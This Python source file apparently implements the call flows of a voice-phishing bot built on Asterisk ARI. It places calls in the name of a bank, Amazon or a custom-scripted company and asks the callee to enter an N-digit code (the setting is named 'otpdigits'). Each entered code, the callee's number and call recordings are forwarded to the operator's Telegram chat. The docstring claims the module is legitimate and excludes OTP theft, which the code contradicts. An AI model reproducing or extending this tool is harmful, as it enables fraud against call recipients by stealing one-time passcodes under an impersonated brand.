"""
IVR call flow handlers (legitimate generic flows).

Replaces Telnyx webhook route logic with in-process handlers driven by ARI events.
Does NOT include fraud-prevention impersonation or OTP-theft workflows.
"""

from __future__ import annotations

import logging
from typing import TYPE_CHECKING

import requests

from config import RECORDINGS_DIR, TELEGRAM_BOT_TOKEN
from db import get_script
from sip_call_manager import CallContext
from tts import synthesize

if TYPE_CHECKING:
    from sip_call_manager import AriCallManager

logger = logging.getLogger(__name__)


def tg_send(chat_id: int, text: str, reply_markup: dict | None = None) -> None:
    if not TELEGRAM_BOT_TOKEN or not chat_id:
        return
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        import json

        data["reply_markup"] = json.dumps(reply_markup)
    requests.post(
        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
        data=data,
        timeout=15,
    )


def _format_script(template: str, ctx: CallContext) -> str:
    return template.format(
        name=ctx.meta.get("name", "customer"),
        company=ctx.meta.get("company", "our company"),
        service=ctx.meta.get("service", "service"),
        digits=ctx.meta.get("otpdigits", ctx.meta.get("digits", "4")),
    )


class FlowDispatcher:
    def __init__(self, manager: "AriCallManager"):
        self.m = manager

    def handle(self, event_type: str, ctx: CallContext, payload: dict) -> None:
        route = ctx.route.split("/")[0] if ctx.route else "voice"
        handler = getattr(self, f"flow_{route}", self.flow_voice)
        handler(event_type, ctx, payload)

    def flow_voice(self, event_type: str, ctx: CallContext, payload: dict) -> None:
        """Generic 2-step IVR: press 1, then enter N-digit reference code."""
        name = ctx.meta.get("name", "customer")
        company = ctx.meta.get("company", ctx.meta.get("service", "support"))
        ndigits = int(ctx.meta.get("otpdigits", ctx.meta.get("digits", "4")))

        if event_type == "call.answered":
            tg_send(ctx.chat_id, "📞 Call answered.")
            text = (
                f"Hello {name}, this is {company} automated line. "
                "Press 1 to continue, or hang up to end."
            )
            sound = synthesize(text, ctx.meta.get("lang"))
            ctx.step = "menu"
            self.m.speak_tts_file(ctx.channel_id, sound)

        elif event_type in ("call.dtmf", "call.gather.ended") and ctx.step == "menu":
            digit = payload.get("digits") or payload.get("digit", "")
            if digit == "1":
                ctx.step = "gathering"
                text = f"Please enter your {ndigits} digit reference number."
                sound = synthesize(text, ctx.meta.get("lang"))
                ctx.gather_max = ndigits
                ctx.digits_buffer = ""
                self.m.speak_tts_file(ctx.channel_id, sound)

        elif event_type == "call.gather.ended" and ctx.step == "gathering":
            code = payload.get("digits", "")
            if len(code) >= ndigits:
                tg_send(
                    ctx.chat_id,
                    f"✅ Reference entered: <code>{code}</code>\n"
                    f"Tag: @{ctx.tag}\nCallee: {ctx.callee}",
                )
                text = "Thank you. Your reference has been recorded. Goodbye."
                sound = synthesize(text, ctx.meta.get("lang"))
                self.m.speak_tts_file(ctx.channel_id, sound)
                ctx.step = "done"

        elif event_type == "call.hangup":
            tg_send(ctx.chat_id, "☎️ Call ended. Use /recall to dial again.")

        elif event_type == "call.recording.saved":
            self._send_recording(ctx, payload)

    def flow_pin(self, event_type: str, ctx: CallContext, payload: dict) -> None:
        """Same as voice but different default prompt (PIN-style reference)."""
        ctx.meta.setdefault("digits", ctx.meta.get("otpdigits", "4"))
        self.flow_voice(event_type, ctx, payload)

    def flow_bank(self, event_type: str, ctx: CallContext, payload: dict) -> None:
        ctx.meta.setdefault("company", ctx.meta.get("bank", "your bank"))
        self.flow_voice(event_type, ctx, payload)

    def flow_email(self, event_type: str, ctx: CallContext, payload: dict) -> None:
        if event_type == "call.answered":
            tg_send(ctx.chat_id, "📞 Call answered (email flow). Recording started.")
            self.m.start_recording(ctx.channel_id, f"email-{ctx.channel_id}")
            text = (
                f"Hello {ctx.meta.get('name', 'customer')}, "
                f"this is {ctx.meta.get('service', 'support')}. "
                "Press 1 to leave a verification message after the tone."
            )
            sound = synthesize(text)
            ctx.step = "menu"
            self.m.speak_tts_file(ctx.channel_id, sound)
        elif event_type == "call.gather.ended" and payload.get("digits") == "1":
            tg_send(ctx.chat_id, "🎙️ Listen to the recording file when the call ends.")
            ctx.step = "recording"
        elif event_type in ("call.hangup", "call.recording.saved"):
            if event_type == "call.hangup":
                tg_send(ctx.chat_id, "☎️ Call ended.")
            else:
                self._send_recording(ctx, payload)
        else:
            self.flow_voice(event_type, ctx, payload)

    def flow_amazon(self, event_type: str, ctx: CallContext, payload: dict) -> None:
        ctx.meta.setdefault("company", "order support")
        self.flow_email(event_type, ctx, payload)

    def flow_custom(self, event_type: str, ctx: CallContext, payload: dict) -> None:
        sid = ctx.meta.get("sid", "")
        doc = get_script(sid) if sid else None
        if not doc:
            if event_type == "call.answered":
                tg_send(ctx.chat_id, "❌ Script not found.")
                self.m.hangup(ctx.channel_id)
            return

        part1 = _format_script(doc["part1"], ctx)
        part2 = _format_script(doc["part2"], ctx)
        part3 = _format_script(doc["part3"], ctx)
        ndigits = int(ctx.meta.get("otpdigits", "4"))

        if event_type == "call.answered":
            tg_send(ctx.chat_id, "📞 Custom script call answered.")
            sound = synthesize(part1, ctx.meta.get("lang"))
            ctx.step = "menu"
            self.m.speak_tts_file(ctx.channel_id, sound)
        elif event_type == "call.gather.ended":
            digits = payload.get("digits", "")
            if ctx.step == "menu" and digits == "1":
                ctx.step = "gathering"
                ctx.gather_max = ndigits
                sound = synthesize(part2, ctx.meta.get("lang"))
                self.m.speak_tts_file(ctx.channel_id, sound)
            elif ctx.step == "gathering" and len(digits) >= ndigits:
                tg_send(ctx.chat_id, f"✅ Input: <code>{digits}</code>")
                sound = synthesize(part3, ctx.meta.get("lang"))
                self.m.speak_tts_file(ctx.channel_id, sound)
                ctx.step = "done"
        elif event_type == "call.hangup":
            tg_send(ctx.chat_id, "☎️ Call ended.")

    def _send_recording(self, ctx: CallContext, rec: dict) -> None:
        name = rec.get("name") or ctx.recording_name
        if not name:
            return
        # Asterisk stores under /var/spp...; copy via RECORDINGS_DIR mount
        path = RECORDINGS_DIR / f"{name}.wav"
        if not path.exists():
            tg_send(ctx.chat_id, f"🎙️ Recording saved: {name}")
            return
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendAudio",
                data={"chat_id": ctx.chat_id},
                files={"audio": f},
                timeout=60,
            )
